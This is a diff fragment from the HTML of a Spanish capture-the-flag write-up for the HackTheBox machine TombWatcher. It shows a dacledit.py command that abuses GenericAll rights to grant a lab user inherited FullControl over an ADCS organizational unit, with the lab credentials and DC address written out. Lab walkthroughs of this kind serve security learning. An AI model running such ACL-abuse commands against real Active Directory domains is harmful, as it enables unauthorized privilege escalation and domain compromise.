@@ -540,7 +540,8 @@
 <p><img alt="tombwatcher_machine 5" loading="lazy" src="/write-ups/active_directory/medium/tombwatcher/fotos/tombwatcher_machine_5.png"></p>
 <p>Si miramos la enumeración en el bloodhound vemos que el usuario JHON tiene permisos <code>GenericAll</code> sobre la Unidad Organizativa (OU) ADCS. Este tipo de permisos puede ser utilizado para añadir una ACE con FullControl y herencia activada, comprometiendo todos los objetos hijos.</p>
 <blockquote>
-<p>Una ACE (Access Control Entry) es un elemento individual en una lista de control de acceso (ACL) que define los permisos para un usuario, grupo u objeto específico.</p></blockquote>
+<p>Una ACE (Access Control Entry) es un elemento individual en una lista de control de acceso (ACL) que define los permisos para un usuario, grupo u objeto específico.</p>
+</blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ dacledit.py -action <span style="color:#e6db74">&#39;write&#39;</span> -rights <span style="color:#e6db74">&#39;FullControl&#39;</span> -inheritance -principal <span style="color:#e6db74">&#39;JOHN&#39;</span> -target-dn <span style="color:#e6db74">&#39;ou=ADCS,dc=TOMBWATCHER,dc=htb&#39;</span> <span style="color:#e6db74">&#39;tombwatcher.htb&#39;</span>/<span style="color:#e6db74">&#39;JOHN&#39;</span>:<span style="color:#e6db74">&#39;Micontrafavorita123!&#39;</span> -dc-ip 10.10.11.72 2&gt;/dev/null
 </span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 </span></span><span style="display:flex;"><span>
